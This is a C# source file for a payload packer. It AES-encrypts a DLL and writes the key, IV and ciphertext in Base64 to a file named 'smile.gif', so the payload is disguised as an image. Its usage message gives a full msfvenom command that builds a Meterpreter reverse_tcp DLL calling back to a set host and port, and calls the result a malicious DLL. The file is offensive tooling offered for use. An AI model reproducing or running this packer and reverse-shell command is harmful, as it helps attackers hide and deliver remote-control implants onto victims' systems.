using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace Encrypt_DLL
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.Write("Please specify file that you want to encrypt.\nTo create malicous DLL please use msfvenom command:\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.4 LPORT=443 EXITFUNC=thread -f dll -o /tmp/payload.dll");
                Console.ReadLine();
                System.Environment.Exit(404);
            }

            string payloadPath = args[0];

            // Check if payload file exists and if not raise exception.
            if (!File.Exists(payloadPath))
            {
                throw new FileNotFoundException($"File not found: {payloadPath}");
            }
            else
            {
                Encrypt(args[0]);
            }

            Console.ReadLine();
        }

        static void Encrypt(string payloadPath)
        {
            Console.Write("Starting to read payload file.\n");
            // Read content of a file to byte array.
            byte[] dllBytes;
            using (FileStream fileStream = new FileStream(payloadPath, FileMode.Open, FileAccess.Read))
            {
                dllBytes = new byte[fileStream.Length];
                fileStream.Read(dllBytes, 0, dllBytes.Length);
            }

            // Create random key
            byte[] key = CreateRandomVec(256);

            // Create random vector
            byte[] IV = CreateRandomVec(128);

            // Encrypt the data
            byte[] encryptedData = EncryptAes(dllBytes, key, IV);
            // Decrypt the data (for demonstration purposes)
            // byte[] decryptedData = DecryptAes(encryptedData, key, iv);

            // Base64 encode data
            byte[] combined = key.Concat(IV).Concat(encryptedData).ToArray();
            string output = Convert.ToBase64String(combined);

            Console.WriteLine($"Encoded form is:\n{output}");

            string outputPath = ".\\smile.gif";
            if (File.Exists(outputPath))
            {
                Console.WriteLine($"File {outputPath} already exists. Removing it.");
                File.Delete(outputPath);
            }

            // Write output to file
            Console.WriteLine($"Writing encoded key, IV and payload to \"{outputPath}\".");
            StreamWriter streamW = new StreamWriter(outputPath);
            streamW.Write(output);
            streamW.Close();

            // Decrypt data.
            byte[] decryptedData = DecryptAes(encryptedData, key, IV);

            //Console.WriteLine($"Decoded form is:\n{decryptedData}");

            string outputPath2 = ".\\decoded.dll";
            if (File.Exists(outputPath2))
            {
                Console.WriteLine($"File {outputPath2} already exists. Removing it.");
                File.Delete(outputPath2);
            }

            using (FileStream fileStream = new FileStream(outputPath2, FileMode.Create, FileAccess.Write))
            {
                fileStream.Write(decryptedData, 0, decryptedData.Length);
            }
        }

        static byte[] CreateRandomVec(int bitsCount)
        {
            int byteCount = bitsCount / 8;
            Random rnd = new Random();
            byte[] byteArray = new byte[byteCount];
            rnd.NextBytes(byteArray);
            return byteArray;
        }
        static byte[] EncryptAes(byte[] input, byte[] key, byte[] iv)
        {
            using (AesManaged aesAlg = new AesManaged())
            {
                aesAlg.Key = key;
                aesAlg.IV = iv;
                aesAlg.Padding = PaddingMode.PKCS7;

                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, aesAlg.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(input, 0, input.Length);
                        cs.FlushFinalBlock();
                    }
                    return ms.ToArray();
                }
            }
        }

        static byte[] DecryptAes(byte[] input, byte[] key, byte[] iv)
        {
            using (AesManaged aesAlg = new AesManaged())
            {
                aesAlg.Key = key;
                aesAlg.IV = iv;
                aesAlg.Padding = PaddingMode.PKCS7;

                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, aesAlg.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(input, 0, input.Length);
                        cs.FlushFinalBlock();
                    }
                    return ms.ToArray();
                }
            }
        }

    }
}
